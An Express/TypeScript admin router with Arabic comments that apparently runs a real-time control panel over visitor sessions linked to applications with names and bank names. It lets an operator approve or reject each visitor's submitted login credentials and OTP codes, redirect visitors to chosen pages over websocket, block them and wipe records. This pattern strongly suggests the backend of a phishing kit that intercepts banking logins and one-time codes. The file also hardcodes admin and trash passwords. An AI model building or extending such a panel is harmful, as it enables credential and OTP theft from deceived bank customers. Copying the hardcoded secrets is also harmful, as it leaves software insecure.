// مسارات الإدارة - تسجيل الدخول والخروج وإدارة الصلاحيات
import { Router } from "express";
import { db, adminConfigTable, sessionsTable, applicationsTable } from "@workspace/db";
import { eq, isNull, isNotNull } from "drizzle-orm";
import { broadcast } from "../lib/websocket";

const router = Router();

// كلمة مرور صفحة سلة المهملات (ثابتة)
const TRASH_PASSWORD = "Adminfayiz2027";

async function getAdminConfig() {
  let [config] = await db.select().from(adminConfigTable).limit(1);
  if (!config) {
    [config] = await db.insert(adminConfigTable).values({
      username: process.env.ADMIN_USERNAME || "admin",
      password: process.env.ADMIN_PASSWORD || "Fa@@20yiz",
    }).returning();
  }
  return config;
}

// تسجيل دخول المدير
router.post("/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: "بيانات غير مكتملة" });
  }
  try {
    const config = await getAdminConfig();
    if (username === config.username && password === config.password) {
      (req.session as any).adminAuthenticated = true;
      (req.session as any).adminUsername = username;
      req.log.info({ username }, "تسجيل دخول المدير بنجاح");
      return res.json({ authenticated: true, username });
    }
    req.log.warn({ username }, "محاولة دخول فاشلة");
    return res.status(401).json({ error: "اسم المستخدم أو كلمة المرور غير صحيحة" });
  } catch (err) {
    req.log.error({ err }, "خطأ في تسجيل الدخول");
    return res.status(500).json({ error: "خطأ في الخادم" });
  }
});

// تسجيل خروج المدير
router.post("/logout", async (req, res) => {
  req.session.destroy((err) => {
    if (err) return res.status(500).json({ error: "فشل في تسجيل الخروج" });
    res.json({ success: true });
  });
});

// التحقق من جلسة المدير الحالية
router.get("/me", async (req, res) => {
  const session = req.session as any;
  // التحقق من أي من الـ session properties
  if (session.adminAuthenticated || session.isAuthenticated) {
    return res.json({
      authenticated: true,
      username: session.adminUsername || session.adminUsername,
    });
  }
  return res.status(401).json({ error: "غير مصادق عليه" });
});

function requireAdmin(req: any, res: any, next: any) {
  const session = req.session as any;
  // التحقق من أي من الـ session properties
  if (session.adminAuthenticated || session.isAuthenticated) {
    next();
  } else {
    return res.status(401).json({ error: "يجب تسجيل الدخول أولاً" });
  }
}

// تغيير كلمة مرور الإدارة
router.post("/change-password", requireAdmin, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  if (!currentPassword || !newPassword) {
    return res.status(400).json({ error: "جميع الحقول مطلوبة" });
  }
  try {
    const config = await getAdminConfig();
    if (currentPassword !== config.password) {
      return res.status(400).json({ error: "كلمة المرور الحالية غير صحيحة" });
    }
    await db.update(adminConfigTable)
      .set({ password: newPassword, updatedAt: new Date() })
      .where(eq(adminConfigTable.id, config.id));
    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "خطأ في تغيير كلمة المرور");
    res.status(500).json({ error: "فشل في تغيير كلمة المرور" });
  }
});

// حظر / رفع حظر مستخدم
router.post("/sessions/:sessionId/block", requireAdmin, async (req, res) => {
  const { sessionId } = req.params;
  const { block, reason } = req.body;
  try {
    const [session] = await db.update(sessionsTable)
      .set({
        isBlocked: !!block,
        blockedReason: block ? (reason || "تم حظرك من قِبل المدير") : null,
        lastSeenAt: new Date(),
      })
      .where(eq(sessionsTable.id, sessionId))
      .returning();
    if (!session) return res.status(404).json({ error: "الجلسة غير موجودة" });
    broadcast({
      type: block ? "user_blocked" : "user_unblocked",
      sessionId,
      reason: block ? (reason || "تم حظرك من قِبل المدير") : null,
    });
    res.json(session);
  } catch (err) {
    req.log.error({ err }, "خطأ في الحظر");
    res.status(500).json({ error: "فشل في تغيير حالة الحظر" });
  }
});

// إرسال رسالة فورية لمستخدم معين أو لجميع المستخدمين
router.post("/notify", requireAdmin, async (req, res) => {
  const { sessionId, message } = req.body;
  if (!message) return res.status(400).json({ error: "الرسالة مطلوبة" });
  try {
    if (sessionId) {
      await db.update(sessionsTable)
        .set({ pendingMessage: message, lastSeenAt: new Date() })
        .where(eq(sessionsTable.id, sessionId));
      broadcast({ type: "notification", sessionId, message });
    } else {
      broadcast({ type: "notification_all", message });
    }
    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "خطأ في الإشعار");
    res.status(500).json({ error: "فشل في إرسال الإشعار" });
  }
});

// قرار بيانات الدخول (credentials)
router.post("/sessions/:sessionId/credentials-decision", requireAdmin, async (req, res) => {
  const { sessionId } = req.params;
  const { decision, message } = req.body;
  try {
    const [session] = await db.update(sessionsTable)
      .set({
        credentialsStatus: decision,
        credentialsMessage: decision === "rejected" ? (message || "بيانات الدخول غير صحيحة، أعد المحاولة") : null,
        currentPage: decision === "approved" ? "verify" : "credentials",
        lastSeenAt: new Date(),
      })
      .where(eq(sessionsTable.id, sessionId))
      .returning();
    if (!session) return res.status(404).json({ error: "الجلسة غير موجودة" });
    broadcast({
      type: "credentials_decision",
      sessionId,
      decision,
      message: decision === "rejected" ? (message || "بيانات الدخول غير صحيحة، أعد المحاولة") : null,
    });
    broadcast({ type: "session_update", data: session });
    res.json(session);
  } catch (err) {
    req.log.error({ err }, "خطأ في قرار بيانات الدخول");
    res.status(500).json({ error: "فشل في تطبيق القرار" });
  }
});

// قرار رمز OTP
router.post("/sessions/:sessionId/otp-decision", requireAdmin, async (req, res) => {
  const { sessionId } = req.params;
  const { decision } = req.body;
  try {
    const [session] = await db.update(sessionsTable)
      .set({
        otpStatus: decision,
        currentPage: decision === "approved" ? "success" : "verify",
        lastSeenAt: new Date(),
      })
      .where(eq(sessionsTable.id, sessionId))
      .returning();
    if (!session) return res.status(404).json({ error: "الجلسة غير موجودة" });
    broadcast({ type: "otp_decision", sessionId, decision });
    broadcast({ type: "session_update", data: session });
    res.json(session);
  } catch (err) {
    req.log.error({ err }, "خطأ في قرار OTP");
    res.status(500).json({ error: "فشل في تطبيق القرار" });
  }
});

// تحريك مستخدم لصفحة معينة
router.post("/sessions/:sessionId/navigate", requireAdmin, async (req, res) => {
  const { sessionId } = req.params;
  const { page } = req.body;
  if (!page) return res.status(400).json({ error: "الصفحة مطلوبة" });
  try {
    const [session] = await db.update(sessionsTable)
      .set({ currentPage: page, pendingNavigation: page, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, sessionId))
      .returning();
    if (!session) return res.status(404).json({ error: "الجلسة غير موجودة" });
    broadcast({ type: "navigate_user", sessionId, page });
    broadcast({ type: "session_update", data: session });
    res.json(session);
  } catch (err) {
    req.log.error({ err }, "خطأ في التنقل");
    res.status(500).json({ error: "فشل في التنقل" });
  }
});

// ─── حذف ناعم (نقل لسلة المهملات) ────────────────────────────────────────

// حذف جلسة واحدة (ناعم) مع طلبها
router.delete("/sessions/:sessionId", requireAdmin, async (req, res) => {
  const { sessionId } = req.params;
  try {
    const now = new Date();
    // حذف ناعم للجلسة
    const [session] = await db.update(sessionsTable)
      .set({ deletedAt: now })
      .where(eq(sessionsTable.id, sessionId))
      .returning();
    if (!session) return res.status(404).json({ error: "الجلسة غير موجودة" });

    // حذف ناعم للطلبات المرتبطة
    await db.update(applicationsTable)
      .set({ deletedAt: now })
      .where(eq(applicationsTable.sessionId, sessionId));

    broadcast({ type: "session_deleted", sessionId });
    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "خطأ في حذف الجلسة");
    res.status(500).json({ error: "فشل في حذف الجلسة" });
  }
});

// حذف جميع الجلسات (ناعم)
router.delete("/sessions", requireAdmin, async (req, res) => {
  try {
    const now = new Date();
    const deleted = await db.update(sessionsTable)
      .set({ deletedAt: now })
      .where(isNull(sessionsTable.deletedAt))
      .returning({ id: sessionsTable.id });

    // حذف ناعم للطلبات المرتبطة
    for (const s of deleted) {
      await db.update(applicationsTable)
        .set({ deletedAt: now })
        .where(eq(applicationsTable.sessionId, s.id));
    }

    broadcast({ type: "all_sessions_deleted" });
    res.json({ success: true, count: deleted.length });
  } catch (err) {
    req.log.error({ err }, "خطأ في حذف الجلسات");
    res.status(500).json({ error: "فشل في حذف الجلسات" });
  }
});

// ─── سلة المهملات ────────────────────────────────────────────────────────────

// التحقق من كلمة مرور سلة المهملات (لا تحتاج جلسة مدير)
router.post("/trash/auth", async (req, res) => {
  const { password } = req.body;
  if (password === TRASH_PASSWORD) {
    return res.json({ authorized: true });
  }
  return res.status(401).json({ error: "كلمة المرور غير صحيحة" });
});

// جلب محتويات سلة المهملات (الجلسات المحذوفة)
router.get("/trash", requireAdmin, async (req, res) => {
  try {
    const sessions = await db
      .select({
        id: sessionsTable.id,
        ipAddress: sessionsTable.ipAddress,
        country: sessionsTable.country,
        userAgent: sessionsTable.userAgent,
        currentPage: sessionsTable.currentPage,
        applicationId: sessionsTable.applicationId,
        isBlocked: sessionsTable.isBlocked,
        lastSeenAt: sessionsTable.lastSeenAt,
        createdAt: sessionsTable.createdAt,
        deletedAt: sessionsTable.deletedAt,
        applicantName: applicationsTable.fullName,
        companyName: applicationsTable.companyName,
        contactName: applicationsTable.contactName,
        bankName: applicationsTable.bankName,
        applicantType: applicationsTable.applicantType,
        appId: applicationsTable.id,
      })
      .from(sessionsTable)
      .leftJoin(applicationsTable, eq(applicationsTable.id, sessionsTable.applicationId))
      .where(isNotNull(sessionsTable.deletedAt))
      .orderBy(sessionsTable.deletedAt);
    res.json(sessions);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب سلة المهملات");
    res.status(500).json({ error: "فشل في جلب سلة المهملات" });
  }
});

// استرجاع جلسة من سلة المهملات
router.post("/trash/:sessionId/restore", requireAdmin, async (req, res) => {
  const { sessionId } = req.params;
  try {
    const [session] = await db.update(sessionsTable)
      .set({ deletedAt: null })
      .where(eq(sessionsTable.id, sessionId))
      .returning();
    if (!session) return res.status(404).json({ error: "الجلسة غير موجودة" });

    // استرجاع الطلبات المرتبطة
    await db.update(applicationsTable)
      .set({ deletedAt: null })
      .where(eq(applicationsTable.sessionId, sessionId));

    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "خطأ في الاسترجاع");
    res.status(500).json({ error: "فشل في الاسترجاع" });
  }
});

// حذف نهائي لجلسة من سلة المهملات
router.delete("/trash/:sessionId", requireAdmin, async (req, res) => {
  const { sessionId } = req.params;
  try {
    // حذف نهائي للطلبات المرتبطة أولاً
    await db.delete(applicationsTable)
      .where(eq(applicationsTable.sessionId, sessionId));
    // حذف نهائي للجلسة
    await db.delete(sessionsTable)
      .where(eq(sessionsTable.id, sessionId));
    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "خطأ في الحذف النهائي");
    res.status(500).json({ error: "فشل في الحذف النهائي" });
  }
});

// تفريغ سلة المهملات بالكامل (حذف نهائي لكل شيء)
router.delete("/trash", requireAdmin, async (req, res) => {
  try {
    const trashed = await db.select({ id: sessionsTable.id })
      .from(sessionsTable)
      .where(isNotNull(sessionsTable.deletedAt));

    for (const s of trashed) {
      await db.delete(applicationsTable).where(eq(applicationsTable.sessionId, s.id));
    }
    await db.delete(sessionsTable).where(isNotNull(sessionsTable.deletedAt));

    res.json({ success: true, count: trashed.length });
  } catch (err) {
    req.log.error({ err }, "خطأ في تفريغ السلة");
    res.status(500).json({ error: "فشل في تفريغ السلة" });
  }
});

export default router;
